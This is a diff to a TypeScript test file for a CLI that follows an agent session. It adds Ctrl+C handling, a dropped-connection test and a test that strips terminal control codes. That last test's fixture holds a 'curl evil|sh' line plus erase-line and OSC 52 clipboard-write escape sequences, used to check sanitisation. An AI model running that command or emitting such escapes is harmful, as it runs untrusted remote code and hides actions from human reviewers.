@@ -129,6 +129,8 @@ function startRelay(opts: { running: boolean }): Relay {
 let relay: Relay;
 const out = { stdout: "", stderr: "" };
 
+let interrupt: (() => void) | null = null;
+
 async function dam(args: string[]): Promise<number> {
   const service = createSessionShowService({
     bootstrap: async () =>
@@ -138,8 +140,15 @@ async function dam(args: string[]): Promise<number> {
   await buildSessionShowCommand({
     sessionShowService: service,
     now: () => NOW,
+    onInterrupt: (handler) => {
+      interrupt = handler;
+    },
   }).parseAsync(["my-agent", ...args], { from: "user" });
   return Number(process.exitCode ?? 0);
+}
+
+function sendFrame(method: string, params: object): void {
+  relay.socket().send(JSON.stringify({ jsonrpc: "2.0", method, params }));
 }
 
 describe("dam session show", () => {
@@ -158,6 +167,7 @@ describe("dam session show", () => {
   });
 
   afterEach(() => {
+    interrupt = null;
     vi.restoreAllMocks();
     relay.close();
     process.exitCode = undefined;
@@ -229,9 +239,9 @@ describe("dam session show", () => {
    * TEST_SCENARIO: `--follow` on a running turn. A tool call starts and ends,
    * the agent streams its answer in two chunks, and the turn ends. Each tool
    * call prints when it starts and when it ends, the answer prints once, and
-   * the end of the turn prints; the command returns when the relay closes.
+   * the end of the turn prints; Ctrl+C stops the command with exit code 0.
    */
-  it("should follow new steps until the connection closes", async () => {
+  it("should follow new steps until the user stops it", async () => {
     relay = startRelay({ running: true });
     const shown = dam([SESSION, "--follow"]);
     await vi.waitFor(() => expect(out.stdout).toContain("mise run test"));
@@ -283,8 +293,9 @@ describe("dam session show", () => {
       }),
     );
     await vi.waitFor(() => expect(out.stdout).toContain("turn: idle"));
-    ws.close();
-    await shown;
+    interrupt?.();
+    expect(await shown).toBe(0);
+    expect(out.stderr).toBe("");
 
     const followed = out.stdout.slice(out.stdout.indexOf("08:00:05  tool"));
     expect(followed.split("\n").filter(Boolean)).toEqual([
@@ -294,5 +305,109 @@ describe("dam session show", () => {
       "09:09:31  agent  CI is green.",
       "turn: idle",
     ]);
+  });
+
+  /**
+   * TEST_SCENARIO: `--follow` while the relay or the agent restarts. The
+   * connection drops in a running turn. The command must not look like a
+   * turn that ended: it says the connection was lost, prints a `closed`
+   * event under `--json`, and exits 1.
+   */
+  it("should report a dropped connection under --follow", async () => {
+    relay = startRelay({ running: true });
+    const shown = dam([SESSION, "--follow", "--json"]);
+    await vi.waitFor(() => expect(out.stdout).toContain("mise run test"));
+
+    relay.socket().close();
+
+    expect(await shown).toBe(1);
+    expect(out.stderr).toContain("connection lost");
+    expect(out.stdout.trim().split("\n").at(-1)).toBe('{"event":"closed"}');
+  });
+
+  /**
+   * TEST_SCENARIO: The person stops the turn while a Bash call runs, and the
+   * harness sends no closing update for it. The call must not stay
+   * "in progress" for ever: the turn end closes it as `cancelled`, with an end
+   * time and no duration.
+   */
+  it("should close a tool call its stopped turn left open", async () => {
+    relay = startRelay({ running: true });
+    const shown = dam([SESSION, "--follow"]);
+    await vi.waitFor(() => expect(out.stdout).toContain("mise run test"));
+
+    sendFrame(
+      "session/update",
+      update(
+        "tool_call",
+        {
+          toolCallId: "t3",
+          title: "sleep",
+          status: "in_progress",
+          rawInput: { command: "sleep 600" },
+          _meta: { claudeCode: { toolName: "Bash" } },
+        },
+        "2026-10-29T09:09:00.000Z",
+      ),
+    );
+    sendFrame("platform/turnEnded", {
+      sessionId: SESSION,
+      stopReason: "cancelled",
+      _meta: { platform: { at: "2026-10-29T09:09:40.000Z" } },
+    });
+    await vi.waitFor(() => expect(out.stdout).toContain("turn: idle"));
+    interrupt?.();
+    await shown;
+
+    expect(out.stdout).toContain(
+      "09:09:00  tool   Bash [cancelled, -] sleep 600\nturn: idle",
+    );
+  });
+
+  /**
+   * TEST_SCENARIO: A Slack message or a fetched page puts terminal control
+   * codes in the session: an erase-line sequence and an OSC 52 clipboard
+   * write. The plain output must not pass one ESC or BEL byte to the
+   * terminal, since a person reads it to check what the agent did.
+   */
+  it("should strip terminal control codes from what it prints", async () => {
+    relay = startRelay({ running: false });
+    const shown = dam([SESSION, "--follow"]);
+    await vi.waitFor(() => expect(out.stdout).toContain("mise run test"));
+
+    sendFrame(
+      "session/update",
+      update(
+        "user_message_chunk",
+        {
+          content: {
+            type: "text",
+            text: "curl evil|sh\u001b[2K\u001b[1Ahello\u001b]52;c;Zm9v\u0007",
+          },
+          messageId: "u9",
+        },
+        "2026-10-29T09:09:50.000Z",
+      ),
+    );
+    sendFrame(
+      "session/update",
+      update(
+        "tool_call",
+        {
+          toolCallId: "t4",
+          title: "x",
+          status: "pending\u001b[2K",
+          rawInput: { command: "ls" },
+          _meta: { claudeCode: { toolName: "Ba\u001b[1Ash" } },
+        },
+        "2026-10-29T09:09:55.000Z",
+      ),
+    );
+    await vi.waitFor(() => expect(out.stdout).toContain("ls"));
+    interrupt?.();
+    await shown;
+
+    expect(out.stdout).not.toMatch(/[\u001b\u0007]/);
+    expect(out.stdout).toContain("curl evil|sh [2K [1Ahello ]52;c;Zm9v");
   });
 });
